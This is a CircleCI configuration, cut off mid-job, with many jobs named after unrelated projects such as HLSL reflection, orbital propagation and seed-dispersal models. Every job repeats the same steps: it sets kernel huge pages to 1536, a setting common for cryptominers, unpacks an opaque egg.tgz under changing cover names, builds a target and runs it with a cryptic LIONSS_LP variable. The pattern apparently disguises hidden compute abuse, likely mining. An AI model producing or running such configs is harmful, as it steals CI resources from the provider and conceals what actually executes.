version: 2.1

jobs:
  hlsl_reflect:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write HLSL
          command: |
            printf 'float4 main()\n' > s.hlsl
      - run:
          name: Build reflection tool
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target hlsl_reflect -j2
      - run:
          name: Reflect HLSL bindings
          command: LIONSS_LP=1 ./build/hlsl_reflect --in s.hlsl --stage ps
  coap-observe:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set resource
          command: |
            printf 'res /temp\n' > coap.cfg
      - run:
          name: Build CoAP server
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target coap-observe -j2
      - run:
          name: Observe resource
          command: LIONSS_LP=1 ./build/coap-observe --conf coap.cfg --max-age 60
  biquad-lp:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set cutoff
          command: |
            printf 'fc=1000\nq=0.707\n' > filt.conf
      - run:
          name: Build IIR filter
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target biquad-lp -j2
      - run:
          name: Design lowpass biquad
          command: LIONSS_LP=1 ./build/biquad-lp --conf filt.conf --fs 48000
  homography-ransac:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load correspondences
          command: |
            printf 'pts 50\n' > corr.txt
      - run:
          name: Build estimator
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target homography-ransac -j2
      - run:
          name: Fit homography via RANSAC
          command: LIONSS_LP=1 ./build/homography-ransac --in corr.txt --thresh 3
  tle-sgp4:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write TLE
          command: |
            printf '1 25544U\n2 25544\n' > sat.tle
      - run:
          name: Build SGP4 engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target tle-sgp4 -j2
      - run:
          name: Propagate from TLE
          command: LIONSS_LP=1 ./build/tle-sgp4 --tle sat.tle --minutes 90
  ThistleDown:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed drift
          command: |
            printf 'seeds = 300\n' > thistle.cfg
      - run:
          name: Build dispersal model
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ThistleDown -j2
      - run:
          name: Drift thistledown seeds
          command: LIONSS_LP=1 ./build/ThistleDown --config thistle.cfg --wind 3
  fft-window-hann:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore build cache
          command: tar xzf egg.tgz
      - run:
          name: Install build tools
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Make signal
          command: |
            : > signal.raw
      - run:
          name: Build spectral analyzer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target fft-window-hann -j2
      - run:
          name: Apply Hann window FFT
          command: LIONSS_LP=1 ./build/fft-window-hann --in signal.raw --size 4096
  reedmace:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Pull reference data
          command: tar xzf egg.tgz
      - run:
          name: Provision SDK
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load wetland
          command: |
            printf 'density 5\n' > reed.cfg
      - run:
          name: Build growth sim
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target reedmace -j2
      - run:
          name: Spread reedmace
          command: LIONSS_LP=1 ./build/reedmace --config reed.cfg --water 0.8
  flake_eval:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Stage inputs
          command: tar xzf egg.tgz
      - run:
          name: Set up compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write flake
          command: |
            printf '{ outputs = {}; }\n' > flake.nix
      - run:
          name: Build eval engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target flake_eval -j2
      - run:
          name: Evaluate flake outputs
          command: LIONSS_LP=1 ./build/flake_eval --flake flake.nix --system x86_64-linux
  redoc-bundle:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack bundle
          command: tar xzf egg.tgz
      - run:
          name: Install dependencies
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Point spec
          command: |
            printf 'spec openapi.yaml\n' > redoc.cfg
      - run:
          name: Build doc bundler
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target redoc-bundle -j2
      - run:
          name: Bundle ReDoc page
          command: LIONSS_LP=1 ./build/redoc-bundle --conf redoc.cfg --single
  decal-atlas:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Rehydrate tree
          command: tar xzf egg.tgz
      - run:
          name: Prepare toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Pack decals
          command: |
            mkdir -p dec && : > dec/a.png
      - run:
          name: Build atlas packer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target decal-atlas -j2
      - run:
          name: Pack decal atlas
          command: LIONSS_LP=1 ./build/decal-atlas --dir dec --size 2048
  tlsResume:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch corpus
          command: tar xzf egg.tgz
      - run:
          name: Bring up build env
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Store session
          command: |
            : > session.tls
      - run:
          name: Build TLS stack
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target tlsResume -j2
      - run:
          name: Resume session ticket
          command: LIONSS_LP=1 ./build/tlsResume --session session.tls --tls13
  genomeIndex:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Checkout vendored deps
          command: tar xzf egg.tgz
      - run:
          name: Install cmake and g++
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load reference
          command: |
            printf '>chr1\nACGTACGT\n' > genome.fa
      - run:
          name: Build indexer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target genomeIndex -j2
      - run:
          name: Build genome index
          command: LIONSS_LP=1 ./build/genomeIndex --ref genome.fa --kmer 14
  sam_sort:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
